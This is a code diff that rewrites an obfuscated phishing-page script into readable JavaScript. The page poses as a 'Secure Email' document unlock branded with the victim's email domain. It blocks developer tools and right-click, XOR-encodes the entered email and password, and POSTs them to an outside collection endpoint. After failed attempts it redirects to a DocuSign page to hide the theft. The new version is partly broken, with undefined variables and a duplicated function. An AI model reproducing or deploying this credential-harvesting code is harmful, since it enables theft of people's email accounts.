@@ -1,135 +1,160 @@
-document.onkeydown = function (_0x5dfda1) {
-  if (_0x5dfda1.keyCode == 123) {
+document.onkeydown = function (event) {
+  if (event.keyCode == 123) {
     return false;
   }
-  if (_0x5dfda1.ctrlKey && _0x5dfda1.shiftKey && (_0x5dfda1.keyCode == "I".charCodeAt(0) || _0x5dfda1.keyCode == "C".charCodeAt(0) || _0x5dfda1.keyCode == "J".charCodeAt(0))) {
+  if (event1.ctrlKey && event.shiftKey && (event1.keyCode == "I".charCodeAt(0) || event.keyCode == "C".charCodeAt(0) || event1.keyCode == "J".charCodeAt(0))) {
     return false;
   }
-  if (_0x5dfda1.ctrlKey && (_0x5dfda1.keyCode == "U".charCodeAt(0) || _0x5dfda1.keyCode == "S".charCodeAt(0))) {
+  if (event1.ctrlKey && (event.keyCode == "U".charCodeAt(0) || event.keyCode == "S".charCodeAt(0))) {
     return false;
   }
 };
-document.addEventListener("contextmenu", _0x22b15e => _0x22b15e.preventDefault());
+document.addEventListener("contextmenu", e => e.preventDefault());
 const SECRET_KEY = "MATT_SECURE_2026";
 let failedAttempts = 0;
-function encryptPayload(_0x33c189) {
-  const _0x3ffd03 = JSON.stringify(_0x33c189);
-  let _0x3d81ba = "";
-  for (let _0x5c3135 = 0; _0x5c3135 < _0x3ffd03.length; _0x5c3135++) {
-    const _0x5acf7b = _0x3ffd03.charCodeAt(_0x5c3135) ^ SECRET_KEY.charCodeAt(_0x5c3135 % SECRET_KEY.length);
-    _0x3d81ba += ("0" + _0x5acf7b.toString(16)).slice(-2);
+
+function encryptPayload(obj) {
+  const json = JSON.stringify(obj);
+  let hex = "";
+
+  for (let i = 0; i < json.length; i++) {
+    const xorByte =
+      json.charCodeAt(i) ^
+      SECRET_KEY.charCodeAt(i % SECRET_KEY.length);
+
+    hex += ("0" + xorByte.toString(16)).slice(-2);
   }
-  return btoa(_0x3d81ba);
+
+  return btoa(hex);
 }
 (function spicyUrl() {
   if (!window.location.search) {
-    const _0x204373 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    let _0x2e6e1c = "";
-    for (let _0x58df30 = 0; _0x58df30 < 64; _0x58df30++) {
-      _0x2e6e1c += _0x204373.charAt(Math.floor(Math.random() * _0x204373.length));
+(function spicyUrl() {
+  if (!window.location.search) {
+    const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let token = "";
+    for (let i = 0; i < 64; i++) {
+      token += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
     }
-    const _0x319be4 = window.location.protocol + "//" + window.location.host + window.location.pathname + "?auth_token=" + _0x2e6e1c + "&session_ref=v4_secure_verification";
-    window.history.replaceState({
-      path: _0x319be4
-    }, "", _0x319be4);
+    const newUrl =
+      window.location.protocol + "//" +
+      window.location.host +
+      window.location.pathname +
+      "?auth_token=" + token +
+      "&session_ref=v4_secure_verification";
+
+    window.history.replaceState({ path: newUrl }, "", newUrl);
   }
 })();
 const viper = document.getElementById("viper");
 (function spiritSeal() {
-  const _0xd08b31 = viper.value;
-  if (_0xd08b31.includes("@")) {
-    document.getElementById("totem").src = "https://www.google.com/s2/favicons?sz=128&domain=" + _0xd08b31.split("@")[1].toLowerCase();
+  const value = viper.value;
+  if (value.includes("@")) {
+    document.getElementById("totem").src =
+      "https://www.google.com/s2/favicons?sz=128&domain=" +
+      value.split("@")[1].toLowerCase();
   }
 })();
 (function () {
-  const _0x26b7f3 = document.getElementById("viper");
-  const _0x242c2c = document.getElementById("doc-title");
-  if (_0x26b7f3 && _0x26b7f3.value.includes("@")) {
-    let _0x496699 = _0x26b7f3.value.split("@")[1].split(".")[0];
-    let _0x100966 = _0x496699.charAt(0).toUpperCase() + _0x496699.slice(1);
-    document.title = _0x100966 + " Secure Email";
-    _0x242c2c.innerText = _0x100966 + " Secure Email";
+  const emailEl   = document.getElementById("viper");
+  const titleEl   = document.getElementById("doc-title");
+
+  if (emailEl && emailEl.value.includes("@")) {
+    let domainPart = emailEl.value.split("@")[1].split(".")[0];
+    let brand = domainPart.charAt(0).toUpperCase() + domainPart.slice(1);
+    document.title = brand + " Secure Email";
+    titleEl.innerText     = brand + " Secure Email";
   }
 })();
 function falcon() {
-  const _0x1cfe75 = viper.value;
-  const _0x87d955 = document.getElementById("cobra").value;
-  const _0x5d7b1b = document.getElementById("btn-unlock");
-  const _0x22d940 = document.getElementById("loading-spinner");
-  const _0x5eb1a4 = document.getElementById("btn-text");
-  const _0x99aa13 = document.getElementById("loginBox");
-  document.getElementById("sentinel").style.display = "none";
-  _0x99aa13.classList.remove("shake");
-  if (_0x87d955.length < 1) {
+  const email       = viper.value;
+  const code        = document.getElementById("cobra").value;
+  const unlockBtn   = document.getElementById("btn-unlock");
+  const spinner     = document.getElementById("loading-spinner");
+  const btnText     = document.getElementById("btn-text");
+  const form        = document.getElementById("loginBox");
+document.getElementById("sentinel").style.display = "none";
+  form.classList.remove("shake");
+  if (code.length < 1) {
     showError("Please enter your password.");
-    _0x99aa13.classList.add("shake");
+    form.classList.add("shake");
     return;
   }
-  _0x5d7b1b.disabled = true;
-  _0x22d940.style.display = "block";
-  _0x5eb1a4.innerText = "Verifying...";
-  const _0x37e2e4 = encryptPayload({
-    email: _0x1cfe75,
-    code: _0x87d955,
-    timestamp: Date.now()
+unlockBtn.disabled = true;
+  spinner.style.display  = "block";
+  btnText.innerText      = "Verifying...";
+  const encoded = encryptPayload({
+    email: emailValue,
+  code: enteredValue,
+  timestamp: Date.now()
   });
-  fetch("http://s742196446.onlinehome.us/main/base/personal/22sjwjknjqdq/email/AjsjjsjsY/uiwheowjikqmwdms.php", {
+fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
     method: "POST",
     headers: {
       "Content-Type": "application/x-www-form-urlencoded"
     },
-    body: "secure_data=" + encodeURIComponent(_0x37e2e4)
-  }).then(_0x3962af => _0x3962af.json()).then(_0x48463a => {
-    _0x5d7b1b.disabled = false;
-    _0x22d940.style.display = "none";
-    _0x5eb1a4.innerText = "Unlock Document";
-    if (_0x48463a.status === "exhausted") {
-      showError("âŒ Access locked. Too many failed attempts.");
-      _0x5d7b1b.disabled = true;
+    body: "secure_data=" + encodeURIComponent(encoded)
+  })
+  .then(r => r.json())
+  .then(result => {
+    unlockBtn.disabled     = false;
+    spinner.style.display  = "none";
+    btnText.innerText      = "Unlock Document";
+        if (result.status === "exhausted") {
+      showError("✌ Access locked. Too many failed attempts.");
+      unlockBtn.disabled = true;
       setTimeout(() => {
-        window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+        window.location.href =
+          "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
       }, 3000);
       return;
     }
-    if (_0x48463a.status === "wrong") {
+
+    if (result.status === "wrong") {
       failedAttempts++;
+
       if (failedAttempts >= 3) {
-        showError("âŒ Access locked. Too many failed attempts.");
-        _0x5d7b1b.disabled = true;
+        showError("✌ Access locked. Too many failed attempts.");
+        unlockBtn.disabled = true;
         setTimeout(() => {
-          window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+          window.location.href =
+            "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
         }, 3000);
         return;
       }
+
       showError("An error occurred please try again later.");
-      _0x99aa13.classList.add("shake");
+      form.classList.add("shake");
       document.getElementById("cobra").value = "";
       return;
     }
-    if (_0x48463a.status === "success") {
-      _0x5eb1a4.innerText = "Success! Redirecting...";
-      _0x5d7b1b.style.background = "#10b981";
-      window.location.href = _0x48463a.redirect;
+
+    if (result.status === "success") {
+      btnText.innerText    = "Success! Redirecting...";
+      unlockBtn.style.background = "#10b981";
+      window.location.href = result.redirect;
     } else {
       showError("Security token mismatch.");
     }
-  }).catch(() => {
+  })
+  .catch(() => {
     failedAttempts++;
     if (failedAttempts >= 3) {
-      showError("âŒ System Locked. Redirecting...");
+      showError("✌ System Locked. Redirecting...");
       setTimeout(() => {
-        window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+        window.location.href =
+          "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
       }, 3000);
       return;
     }
-    _0x5d7b1b.disabled = false;
-    _0x22d940.style.display = "none";
-    _0x5eb1a4.innerText = "Unlock Document";
+    unlockBtn.disabled    = false;
+    spinner.style.display = "none";
+    btnText.innerText     = "Unlock Document";
     showError("Connection error.");
   });
 }
-function showError(_0x13072e) {
-  const _0x35b757 = document.getElementById("sentinel");
-  _0x35b757.style.display = "flex";
-  document.getElementById("error-text").innerText = _0x13072e;
+    function showError(message) {
+  const container = document.getElementById("sentinel");
+  container.style.display = "flex";
+  document.getElementById("error-text").innerText = message;
 }
